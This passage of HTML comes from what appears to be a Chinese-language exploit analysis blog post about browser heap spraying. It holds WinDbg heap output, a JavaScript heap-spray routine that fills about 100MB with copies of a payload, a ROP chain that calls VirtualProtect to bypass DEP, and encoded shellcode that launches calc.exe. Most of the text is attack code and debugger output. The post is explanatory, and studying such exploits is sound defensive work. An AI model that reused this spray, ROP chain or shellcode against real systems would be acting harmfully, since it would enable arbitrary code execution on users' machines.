class=\"line\">&gt; !heap -stat -h 00360000</span><br><span class=\"line\">&gt; </span><br><span class=\"line\">&gt; heap @ 00360000</span><br><span class=\"line\">&gt; group-by: TOTSIZE max-display: 20</span><br><span class=\"line\">&gt;  size     #blocks     total     ( %) (percent of total busy bytes)</span><br><span class=\"line\">&gt;  fffe0 65 - 64ff360  (99.12)</span><br><span class=\"line\">&gt;  40010 1 - 40010  (0.25)</span><br><span class=\"line\">&gt;  1034 10 - 10340  (0.06)</span><br><span class=\"line\">&gt;  20 356 - 6ac0  (0.03)</span><br><span class=\"line\">&gt;  494 16 - 64b8  (0.02)</span><br><span class=\"line\">&gt;  5ba0 1 - 5ba0  (0.02)</span><br><span class=\"line\">&gt;  5e4 b - 40cc  (0.02)</span><br><span class=\"line\">&gt;  4010 1 - 4010  (0.02)</span><br><span class=\"line\">&gt;  3980 1 - 3980  (0.01)</span><br><span class=\"line\">&gt;  d0 3e - 3260  (0.01)</span><br><span class=\"line\">&gt;  460 b - 3020  (0.01)</span><br><span class=\"line\">&gt;  1800 2 - 3000  (0.01)</span><br><span class=\"line\">&gt;  800 6 - 3000  (0.01)</span><br><span class=\"line\">&gt;  468 a - 2c10  (0.01)</span><br><span class=\"line\">&gt;  2890 1 - 2890  (0.01)</span><br><span class=\"line\">&gt;  78 52 - 2670  (0.01)</span><br><span class=\"line\">&gt;  10 215 - 2150  (0.01)</span><br><span class=\"line\">&gt;  1080 2 - 2100  (0.01)</span><br><span class=\"line\">&gt;  2b0 c - 2040  (0.01)</span><br><span class=\"line\">&gt;  2010 1 - 2010  (0.01)</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<blockquote>\n<p>可以看到有0x65（101）个size为0xfffe0（1MB减去20字节的堆头）。</p>\n<p>然后查看特定大小的堆块，接下来的命令列出了所有大小为0xfffe0的堆块。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; !heap -flt s fffe0</span><br><span class=\"line\">&gt; </span><br><span class=\"line\">&gt; \t\t_HEAP @ 360000</span><br><span class=\"line\">&gt;    HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state</span><br><span class=\"line\">&gt;      037f0018 1fffc fffc  [00]   037f0020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">&gt;      038f0018 1fffc fffc  [00]   038f0020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">&gt;      039f0018 1fffc fffc  [00]   039f0020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">&gt;      03af0018 1fffc fffc  [00]   03af0020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">&gt;      03bf0018 1fffc fffc  [00]   03bf0020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">&gt;      05e80018 1fffc fffc  [00]   05e80020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">&gt;      05f80018 1fffc fffc  [00]   05f80020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">&gt;      06080018 1fffc fffc  [00]   06080020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">&gt;      06180018 1fffc fffc  [00]   06180020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">&gt;      …</span><br><span class=\"line\">&gt;      0aa80018 1fffc fffc  [00]   0aa80020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">&gt;      0ab80018 1fffc fffc  [00]   0ab80020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">&gt;      0ac80018 1fffc fffc  [00]   0ac80020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">&gt;      0ad80018 1fffc fffc  [00]   0ad80020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">&gt;      0ae80018 1fffc fffc  [00]   0ae80020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">&gt;      0af80018 1fffc fffc  [00]   0af80020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">&gt;      0b080018 1fffc fffc  [00]   0b080020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">&gt;      0b180018 1fffc fffc  [00]   0b180020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">&gt;      0b280018 1fffc fffc  [00]   0b280020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">&gt;      0b380018 1fffc fffc  [00]   0b380020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">&gt;  _HEAP @ 10000</span><br><span class=\"line\">&gt;  _HEAP @ 270000</span><br><span class=\"line\">&gt;  _HEAP @ 750000</span><br><span class=\"line\">&gt;  _HEAP @ 2e20000</span><br><span class=\"line\">&gt;  _HEAP @ 35b0000</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<blockquote>\n<p>每次分配都是顺序分配的。</p>\n<p>因为我们能看到堆块的地址，我们查看一下0x41的位置（即shellcode的位置）：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; 0:007&gt; db 06b80000</span><br><span class=\"line\">&gt; 06b80000  00 00 c8 06 00 00 a8 06-00 00 00 00 00 00 00 00  ................</span><br><span class=\"line\">&gt; 06b80010  00 00 10 00 00 00 10 00-61 65 15 29 00 00 00 04  ........ae.)....</span><br><span class=\"line\">&gt; 06b80020  da ff 0f 00 41 41 41 41-41 41 41 41 41 41 41 41  ....AAAAAAAAAAAA</span><br><span class=\"line\">&gt; 06b80030  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br><span class=\"line\">&gt; 06b80040  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br><span class=\"line\">&gt; 06b80050  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br><span class=\"line\">&gt; 06b80060  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br><span class=\"line\">&gt; 06b80070  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<blockquote>\n<p>我们能够清楚地看到0x20偏移处的值，为字符串的长度——0xfffda，是减去NULL终止符的字符串长度。</p>\n</blockquote>\n<p>理解了这个后，我们再来看exp。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"comment\">//初始化堆喷数据</span></span><br><span class=\"line\"> <span class=\"keyword\">var</span> padding = <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u9090\"</span>); <span class=\"comment\">// unescape函数将类似%xx和%uxxxx的字符序列（x表示十六进制数字），用Unicode字符\\u00xx和\\uxxxx替换这样的字符序列进行解码。这里\\x90是NOP指令</span></span><br><span class=\"line\"> <span class=\"keyword\">while</span> (padding.length &lt; <span class=\"number\">1000</span>)</span><br><span class=\"line\">     padding = padding + padding; </span><br><span class=\"line\"> <span class=\"keyword\">var</span> padding = padding.substr(<span class=\"number\">0</span>, <span class=\"number\">1000</span> - shellcode.length);</span><br><span class=\"line\"> shellcode+= padding; <span class=\"comment\">// 在ROP+shellcode后padding NOP指令到1000字节，但是内存中实际分配2000字节</span></span><br><span class=\"line\"> <span class=\"keyword\">while</span> (shellcode.length &lt; <span class=\"number\">100000</span>) </span><br><span class=\"line\">     shellcode = shellcode + shellcode;</span><br><span class=\"line\"> <span class=\"keyword\">var</span> onemeg = shellcode.substr(<span class=\"number\">0</span>, <span class=\"number\">64</span>*<span class=\"number\">1024</span>/<span class=\"number\">2</span>); <span class=\"comment\">// 64K</span></span><br><span class=\"line\"> <span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>; i&lt;<span class=\"number\">14</span>; i++) &#123;</span><br><span class=\"line\">     onemeg += shellcode.substr(<span class=\"number\">0</span>, <span class=\"number\">64</span>*<span class=\"number\">1024</span>/<span class=\"number\">2</span>);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> onemeg += shellcode.substr(<span class=\"number\">0</span>, (<span class=\"number\">64</span>*<span class=\"number\">1024</span>/<span class=\"number\">2</span>)-(<span class=\"number\">38</span>/<span class=\"number\">2</span>)); <span class=\"comment\">// 64K * 16，即1MB</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//通过堆喷布局rop和shellcode</span></span><br><span class=\"line\"> <span class=\"keyword\">var</span> spray = <span class=\"keyword\">new</span> <span class=\"built_in\">Array</span>();</span><br><span class=\"line\"> <span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>; i&lt;<span class=\"number\">100</span>; i++) &#123;</span><br><span class=\"line\">     spray[i] = onemeg.substr(<span class=\"number\">0</span>, onemeg.length);</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<p>单次堆喷数据的组织形式其实与上述是类似的</p>\n<ul>\n<li>ROP（栈迁移） + shellcode + padding = 1000 byte</li>\n<li>不断重复，直到64K</li>\n<li>再以64K的块，扩展到1MB（64KB*16）</li>\n<li>喷100次，共100MB</li>\n</ul>\n<p>稍微看一下ROP链和shellcode的代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> shellcode = <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u4141%u4141%u4242%u4242%u4343%u4343\"</span>); <span class=\"comment\">// PADDING</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u4141%u4141%u4242%u4242%u4343%u4343\"</span>); <span class=\"comment\">// PADDING</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u4141%u4141\"</span>); <span class=\"comment\">// PADDING</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//ROP链中的Gadget地址和参数布局，以实现栈转移和DEP绕过</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop1+<span class=\"string\">\"%u\"</span>+rop2); <span class=\"comment\">// RETN</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop3+<span class=\"string\">\"%u\"</span>+rop4); <span class=\"comment\">// POP EBP # RETN</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop5+<span class=\"string\">\"%u\"</span>+rop6); <span class=\"comment\">// XCHG EAX,ESP # RETN</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop3+<span class=\"string\">\"%u\"</span>+rop4); <span class=\"comment\">// POP EBP</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop3+<span class=\"string\">\"%u\"</span>+rop4); <span class=\"comment\">// POP EBP</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop7+<span class=\"string\">\"%u\"</span>+rop8); <span class=\"comment\">// POP EBP</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u1024%u0000\"</span>); <span class=\"comment\">// Size 0x00001024</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop9+<span class=\"string\">\"%u\"</span>+rop10); <span class=\"comment\">// POP EDX</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u0040%u0000\"</span>); <span class=\"comment\">// 0x00000040</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop11+<span class=\"string\">\"%u\"</span>+rop12); <span class=\"comment\">// POP ECX</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+writable1+<span class=\"string\">\"%u\"</span>+writable2); <span class=\"comment\">// Writable Location</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop13+<span class=\"string\">\"%u\"</span>+rop14); <span class=\"comment\">// POP EDI</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop1+<span class=\"string\">\"%u\"</span>+rop2); <span class=\"comment\">// RET</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop15+<span class=\"string\">\"%u\"</span>+rop16); <span class=\"comment\">// POP ESI</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+jmpeax1+<span class=\"string\">\"%u\"</span>+jmpeax2); <span class=\"comment\">// JMP EAX</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop17+<span class=\"string\">\"%u\"</span>+rop18); <span class=\"comment\">// POP EAX</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+vp1+<span class=\"string\">\"%u\"</span>+vp2); <span class=\"comment\">// VirtualProtect()</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop19+<span class=\"string\">\"%u\"</span>+rop20); <span class=\"comment\">// MOV EAX,DWORD PTR DS:[EAX]</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop21+<span class=\"string\">\"%u\"</span>+rop22); <span class=\"comment\">// PUSHAD</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u\"</span>+rop23+<span class=\"string\">\"%u\"</span>+rop24); <span class=\"comment\">// PUSH ESP</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u9090%u9090\"</span>); <span class=\"comment\">// NOPs</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u9090%u9090\"</span>); <span class=\"comment\">// NOPs</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%u9090%u9090\"</span>); <span class=\"comment\">// NOPs</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//弹出计算器的shellcode</span></span><br><span class=\"line\">shellcode+= <span class=\"built_in\">unescape</span>(<span class=\"string\">\"%ue8fc%u0089%u0000%u8960%u31e5%u64d2%u528b%u8b30\"</span> + </span><br><span class=\"line\">                         <span class=\"string\">\"%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%uc031\"</span> + </span><br><span class=\"line\">                         <span class=\"string\">\"%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf0e2%u5752\"</span> + </span><br><span class=\"line\">                         <span class=\"string\">\"%u528b%u8b10%u3c42%ud001%u408b%u8578%u74c0%u014a\"</span> + </span><br><span class=\"line\">                         <span class=\"string\">\"%u50d0%u488b%u8b18%u2058%ud301%u3ce3%u8b49%u8b34\"</span> + </span><br><span class=\"line\">                         <span class=\"string\">\"%ud601%uff31%uc031%uc1ac%u0dcf%uc701%ue038%uf475\"</span> + </span><br><span class=\"line\">                         <span class=\"string\">\"%u7d03%u3bf8%u247d%ue275%u8b58%u2458%ud301%u8b66\"</span> + </span><br><span class=\"line\">                         <span class=\"string\">\"%u4b0c%u588b%u011c%u8bd3%u8b04%ud001%u4489%u2424\"</span> + </span><br><span class=\"line\">                         <span class=\"string\">\"%u5b5b%u5961%u515a%ue0ff%u5f58%u8b5a%ueb12%u5d86\"</span> + </span><br><span class=\"line\">                         <span class=\"string\">\"%u016a%u858d%u00b9%u0000%u6850%u8b31%u876f%ud5ff\"</span> + </span><br><span class=\"line\">                         <span class=\"string\">\"%uf0bb%ua2b5%u6856%u95a6%u9dbd%ud5ff%u063c%u0a7c\"</span> + </span><br><span class=\"line\">                         <span class=\"string\">\"%ufb80%u75e0%ubb05%u1347%u6f72%u006a%uff53%u63d5\"</span> + </span><br><span class=\"line\">                         <span class=\"string\">\"%u6c61%u2e63%u7865%u0065\"</span>);</span><br></pre></td></tr></table></figure>\n<p>也就是说第一条gadget的前面还有14 * 2 = 28字节(0x1c)的padding，所以第一条gadget的地址应该为0x24+0x1c = 0x40</p>\n<p>调试验证：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:005&gt; !heap -stat</span><br><span class=\"line\">_HEAP 003d0000</span><br><span class=\"line\">     Segments            00000001</span><br><span class=\"line\">         Reserved  bytes 00100000</span><br><span class=\"line\">         Committed bytes 00100000</span><br><span class=\"line\">     VirtAllocBlocks     00000001</span><br><span class=\"line\">         VirtAlloc bytes 038b0000</span><br><span class=\"line\">_HEAP 02cc0000</span><br><span class=\"line\">     Segments            00000001</span><br><span class=\"line\">         Reserved  bytes 00040000</span><br><span class=\"line\">         Committed bytes 0002b000</span><br><span class=\"line\">     VirtAllocBlocks     00000000</span><br><span class=\"line\">         VirtAlloc bytes 00000000</span><br><span class=\"line\">_HEAP 01240000</span><br><span class=\"line\">     Segments            00000001</span><br><span class=\"line\">         Reserved  bytes 00040000</span><br><span class=\"line\">         Committed bytes 00012000</span><br><span class=\"line\">     VirtAllocBlocks     00000000</span><br><span class=\"line\">         VirtAlloc bytes 00000000</span><br><span class=\"line\">_HEAP 002f0000</span><br><span class=\"line\">     Segments            00000001</span><br><span class=\"line\">         Reserved  bytes 00010000</span><br><span class=\"line\">         Committed bytes 00010000</span><br><span class=\"line\">     VirtAllocBlocks     00000000</span><br><span class=\"line\">         VirtAlloc bytes 00000000</span><br><span class=\"line\">_HEAP 024a0000</span><br><span class=\"line\">     Segments            00000001</span><br><span class=\"line\">         Reserved  bytes 00040000</span><br><span class=\"line\">         Committed bytes 00001000</span><br><span class=\"line\">     VirtAllocBlocks     00000000</span><br><span class=\"line\">         VirtAlloc bytes 00000000</span><br><span class=\"line\">_HEAP 00010000</span><br><span class=\"line\">     Segments            00000001</span><br><span class=\"line\">         Reserved  bytes 00010000</span><br><span class=\"line\">         Committed bytes 00001000</span><br><span class=\"line\">     VirtAllocBlocks     00000000</span><br><span class=\"line\">         VirtAlloc bytes 00000000</span><br><span class=\"line\">0:005&gt; !heap -stat -h 003d0000</span><br><span class=\"line\"> heap @ 003d0000</span><br><span class=\"line\">group-by: TOTSIZE max-display: 20</span><br><span class=\"line\">    size     #blocks     total     ( %) (percent of total busy bytes)</span><br><span class=\"line\">    fffe0 65 - 64ff360  (98.77)</span><br><span class=\"line\">    3e810 1 - 3e810  (0.24)</span><br><span class=\"line\">    100 269 - 26900  (0.15)</span><br><span class=\"line\">    fc fb - f714  (0.06)</span><br><span class=\"line\">    1034 f - f30c  (0.06)</span><br><span class=\"line\">    7d10 1 - 7d10  (0.03)</span><br><span class=\"line\">    494 1b - 7b9c  (0.03)</span><br><span class=\"line\">    20 356 - 6ac0  (0.03)</span><br><span class=\"line\">    58 125 - 64b8  (0.02)</span><br><span class=\"line\">    5ba0 1 - 5ba0  (0.02)</span><br><span class=\"line\">    40 163 - 58c0  (0.02)</span><br><span class=\"line\">    4c 121 - 55cc  (0.02)</span><br><span class=\"line\">    52ac 1 - 52ac  (0.02)</span><br><span class=\"line\">    5e4 b - 40cc  (0.02)</span><br><span class=\"line\">    200c 2 - 4018  (0.02)</span><br><span class=\"line\">    3e90 1 - 3e90  (0.01)</span><br><span class=\"line\">    3de0 1 - 3de0  (0.01)</span><br><span class=\"line\">    3ddc 1 - 3ddc  (0.01)</span><br><span class=\"line\">    3980 1 - 3980  (0.01)</span><br><span class=\"line\">    d0 3d - 3190  (0.01)</span><br><span class=\"line\">0:005&gt; !heap -flt s fffe0</span><br><span class=\"line\">    _HEAP @ 3d0000</span><br><span class=\"line\">      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state</span><br><span class=\"line\">        03280018 1fffc 0000  [00]   03280020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        038b0018 1fffc fffc  [00]   038b0020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        039b0018 1fffc fffc  [00]   039b0020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        04a00018 1fffc fffc  [00]   04a00020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        04b00018 1fffc fffc  [00]   04b00020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        04c00018 1fffc fffc  [00]   04c00020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        04d00018 1fffc fffc  [00]   04d00020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        04e00018 1fffc fffc  [00]   04e00020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        04f00018 1fffc fffc  [00]   04f00020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        05000018 1fffc fffc  [00]   05000020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        06550018 1fffc fffc  [00]   06550020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        06650018 1fffc fffc  [00]   06650020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        06750018 1fffc fffc  [00]   06750020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        06850018 1fffc fffc  [00]   06850020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        06950018 1fffc fffc  [00]   06950020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        06a50018 1fffc fffc  [00]   06a50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        06b50018 1fffc fffc  [00]   06b50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">        06c50018 1fffc fffc  [00]   06c50020    fffe0 - (busy VirtualAlloc)</span><br><span class=\"line\">  